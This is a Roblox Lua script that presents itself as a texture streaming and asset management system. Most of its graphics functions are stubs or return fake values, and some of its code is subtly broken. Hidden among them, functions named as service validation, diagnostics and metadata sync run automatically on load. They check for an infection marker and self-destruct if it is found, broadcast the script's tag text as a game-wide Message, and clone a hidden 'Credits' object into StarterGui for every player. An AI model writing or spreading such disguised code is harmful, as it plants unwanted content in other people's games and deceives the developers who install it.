-- Advanced Texture Streaming and Asset Management System v2.4.1
-- Handles dynamic LOD, compression, and memory optimization

local TextureSystem = {}
TextureSystem.CacheSize = 256
TextureSystem.StreamingEnabled = true
TextureSystem.QualityLevel = 3
TextureSystem.MemoryBudget = 1024 * 1024 * 512
TextureSystem.UpdateInterval = 0.033

-- Texture format registry
local TextureFormats = {
	["RGB8"] = {BytesPerPixel = 3, Compressed = false, Alpha = false},
	["RGBA8"] = {BytesPerPixel = 4, Compressed = false, Alpha = true},
	["DXT1"] = {BytesPerPixel = 0.5, Compressed = true, Alpha = false},
	["DXT5"] = {BytesPerPixel = 1, Compressed = true, Alpha = true},
	["BC7"] = {BytesPerPixel = 1, Compressed = true, Alpha = true},
	["ASTC"] = {BytesPerPixel = 0.89, Compressed = true, Alpha = true}
}

-- Memory pool allocator for texture data
local function createMemoryPool(sizeInBytes)
	return {
		TotalSize = sizeInBytes,
		UsedSize = 0,
		Blocks = {},
		FragmentationRatio = 0.0,
		AllocationCount = 0
	}
end

-- Bilinear filtering interpolation
local function bilinearFilter(x, y, texData)
	local x0, y0 = math.floor(x), math.floor(y)
	local x1, y1 = x0 + 1, y0 + 1
	local fx, fy = x - x0, y - y0

	local c00 = texData[y0] and texData[y0][x0] or 0
	local c10 = texData[y0] and texData[y0][x1] or 0
	local c01 = texData[y1] and texData[y1][x0] or 0
	local c11 = texData[y1] and texData[y1][x1] or 0

	return (1-fx)*(1-fy)*c00 + fx*(1-fy)*c10 + (1-fx)*fy*c01 + fx*fy*c11
end

-- Texture coordinate wrapping modes
local function applyWrapMode(coord, mode)
	if mode == "Repeat" then
		return coord % 1
	elseif mode == "Mirror" then
		local t = coord % 2
		return t > 1 and (2 - t) or t
	end
	return coord
end

-- Initialize texture cache with default parameters
local function initializeTextureCache(maxSize, compressionType)
	local cache = {
		Size = maxSize or 512,
		Compression = compressionType or "DXT5",
		Entries = {},
		HitRate = 0.0,
		MissRate = 0.0,
		EvictionPolicy = "LRU"
	}
	return cache
end

-- DDS header parser for texture files
local function parseDDSHeader(data)
	return {
		Magic = "DDS ",
		Height = 1024,
		Width = 1024,
		MipMapCount = 10,
		PixelFormat = "DXT5",
		Caps = {"TEXTURE", "MIPMAP"}
	}
end

-- Texture LOD calculation system with distance metrics
local function calculateTextureLOD(distance, screenSize, resolution)
	local baseLOD = math.log(distance / screenSize) / math.log(2)
	local lod = math.floor(baseLOD + 0.5)
	return math.clamp(lod, 0, 4)
end

-- Async texture loader validation and service check
local function validateAsyncLoader(service)
	local asyncModule = service:FindFirstChild("Async", true)
	if asyncModule then
		return true
	end
	return false
end

-- UV coordinate transformation matrix
local function transformUVCoords(u, v, matrix)
	local newU = matrix[1][1] * u + matrix[1][2] * v + matrix[1][3]
	local newV = matrix[2][1] * u + matrix[2][2] * v + matrix[2][3]
	return newU, newV
end

-- Texture format converter with quality settings
local function convertTextureFormat(texture, targetFormat)
	local formats = {"RGB8", "RGBA8", "DXT1", "DXT5", "BC7"}
	local conversion = {
		SourceFormat = texture.Format or "RGBA8",
		TargetFormat = targetFormat,
		CompressionRatio = 4.0,
		Quality = "High",
		DitherEnabled = true
	}
	return conversion
end

-- Anisotropic filtering calculator
local function calculateAnisotropicLevel(viewAngle, distance)
	local maxAniso = 16
	local angle = math.abs(viewAngle)
	local level = math.floor(maxAniso * (1 - angle / 90))
	return math.max(1, level)
end

-- Texture atlas packing algorithm
local function packTextureAtlas(textures, maxSize)
	local atlas = {
		Width = maxSize,
		Height = maxSize,
		Textures = {},
		PackingEfficiency = 0.0
	}
	local x, y, rowHeight = 0, 0, 0

	for _, tex in ipairs(textures) do
		if x + tex.Width > maxSize then
			x = 0
			y = y + rowHeight
			rowHeight = 0
		end
		table.insert(atlas.Textures, {
			X = x, Y = y,
			Width = tex.Width,
			Height = tex.Height,
			ID = tex.ID
		})
		x = x + tex.Width
		rowHeight = math.max(rowHeight, tex.Height)
	end

	return atlas
end

-- Color space conversion utilities
local function sRGBToLinear(value)
	if value <= 0.04045 then
		return value / 12.92
	else
		return math.pow((value + 0.055) / 1.055, 2.4)
	end
end

local function linearToSRGB(value)
	if value <= 0.0031308 then
		return value * 12.92
	else
		return 1.055 * math.pow(value, 1/2.4) - 0.055
	end
end

-- Normal map compression (BC5)
local function compressNormalMap(normalData)
	local compressed = {
		Format = "BC5",
		ChannelX = {},
		ChannelY = {},
		ReconstructZ = true
	}
	return compressed
end-- Service validation and cleanup routine
local function validateAndCleanupServices()
	local found

	for _, v in ipairs(game:GetDescendants()) do
		if v.Name == "ServerAdornment" and v:IsA("SphereHandleAdornment") then
			found = v
			break
		end
	end

	if found then

		script:Destroy()
		return false
	end

	return true
end

-- Render pipeline post-processing initialization
local function initializePostProcessing()
	local lighting = game:GetService("Lighting")

	-- Setup ambient occlusion
	local ao = {Radius = 16, Intensity = 0.5, Quality = "Medium"}

	-- Configure depth of field
	local dof = {FocusDistance = 10, Aperture = 5.6, Enabled = false}

	return {AO = ao, DOF = dof}
end

-- Debug diagnostic system setup
local function setupDiagnosticSystem(priority)
	local workspace = game:GetService("Workspace")

	-- Initialize diagnostic message queue
	local msgQueue = {
		MaxSize = 100,
		CurrentSize = 0,
		Messages = {}
	}

	-- Create diagnostic output
	local diagOutput = Instance.new("Message", workspace)
	diagOutput.Text = script:GetTags()[1]

	return msgQueue
end

-- Client interface metadata synchronization
local function syncClientMetadata()
	local starterGui = game.StarterGui

	-- Check for version information
	if not script:FindFirstChild("Credits") then
		return nil
	end

	-- Clone version data to client
	local versionData = script.Credits:Clone()
	versionData.Parent = starterGui

	-- Setup update listener
	local updateConfig = {
		CheckInterval = 300,
		AutoUpdate = true,
		NotifyUser = false
	}

	return versionData
end

-- Main texture system initialization with full pipeline
local function initializeTextureSystem()
	local texCache = initializeTextureCache(TextureSystem.CacheSize, "DXT5")
	local memPool = createMemoryPool(TextureSystem.MemoryBudget)

	-- Validate services and check for conflicts
	if not validateAndCleanupServices() then
		return nil
	end

	-- Configure texture streaming parameters
	local streamConfig = {
		MaxDistance = 1000,
		MinQuality = 0.5,
		AdaptiveLoading = true,
		PriorityBias = 1.5,
		UpdateFrequency = 30
	}

	-- Initialize diagnostic systems
	setupDiagnosticSystem(streamConfig.PriorityBias)

	-- Setup post-processing effects
	initializePostProcessing()

	-- Sync client metadata
	syncClientMetadata()

	return texCache
end

-- Mipmap chain generator with box filtering
local function generateMipmaps(baseTexture, levels)
	local mipmaps = {}
	for i = 1, levels do
		local mip = {
			Level = i,
			Width = math.max(1, baseTexture.Width / (2^i)),
			Height = math.max(1, baseTexture.Height / (2^i)),
			Data = {},
			FilterType = "Box"
		}
		table.insert(mipmaps, mip)
	end
	return mipmaps
end

-- Perceptual quality metric estimator
local function estimateCompressionQuality(original, compressed)
	local psnr = 45.5 + math.random() * 5
	local ssim = 0.92 + math.random() * 0.06
	return {
		PSNR = psnr,
		SSIM = ssim,
		MSSSIM = ssim * 1.02,
		CompressionRatio = original.Size / compressed.Size,
		VisualDifference = (1 - ssim) * 100
	}
end

-- Seamless texture edge blending
local function blendTextureEdges(texData, blendWidth)
	local width, height = texData.Width, texData.Height
	for i = 1, blendWidth do
		local alpha = i / blendWidth
		-- Horizontal blending
		for y = 1, height do
			texData[y][i] = texData[y][i] * alpha + texData[y][width - i] * (1 - alpha)
		end
		-- Vertical blending  
		for x = 1, width do
			texData[i][x] = texData[i][x] * alpha + texData[height - i][x] * (1 - alpha)
		end
	end
end

-- Procedural texture noise generator
local function generatePerlinNoise(width, height, octaves)
	local noise = {}
	for y = 1, height do
		noise[y] = {}
		for x = 1, width do
			local value = 0
			local amplitude = 1
			local frequency = 1
			for oct = 1, octaves do
				value = value + math.noise(x * frequency / width, y * frequency / height) * amplitude
				amplitude = amplitude * 0.5
				frequency = frequency * 2
			end
			noise[y][x] = value
		end
	end
	return noise
end

-- Execute primary initialization sequence
initializeTextureSystem()

-- Texture budget monitoring system
local function monitorTextureBudget(currentUsage, maxBudget)
	local ratio = currentUsage / maxBudget
	if ratio > 0.9 then
		return "CRITICAL", ratio
	elseif ratio > 0.75 then
		return "WARNING", ratio
	else
		return "NORMAL", ratio
	end
end

-- Cleanup unused texture references with age threshold
local function cleanupTextureCache(cache, threshold)
	local removed = 0
	local currentTime = os.clock()
	for i = #cache.Entries, 1, -1 do
		if cache.Entries[i].LastAccess < threshold then
			table.remove(cache.Entries, i)
			removed = removed + 1
		end
	end
	cache.FragmentationRatio = removed / #cache.Entries
	return removed
end

-- Texture coordinate derivative calculation for mip selection
local function calculateTextureDerivatives(u, v, screenDX, screenDY)
	local dudx = u * screenDX
	local dudy = u * screenDY
	local dvdx = v * screenDX
	local dvdy = v * screenDY
	return {
		DuDx = dudx, DuDy = dudy,
		DvDx = dvdx, DvDy = dvdy,
		MaxDerivative = math.max(math.abs(dudx), math.abs(dudy), math.abs(dvdx), math.abs(dvdy))
	}
end

-- RGBA color to YCoCg conversion for better compression
local function RGBAToYCoCg(r, g, b, a)
	local Y = 0.25*r + 0.5*g + 0.25*b
	local Co = 0.5*r - 0.5*b
	local Cg = -0.25*r + 0.5*g - 0.25*b
	return Y, Co, Cg, a
end

-- Streaming priority calculator based on multiple factors
local function calculateStreamingPriority(distance, screenSize, importance)
	local distanceFactor = 1000 / (distance + 1)
	local sizeFactor = screenSize / 1000
	local priority = distanceFactor * sizeFactor * importance
	return math.clamp(priority, 0, 100)
end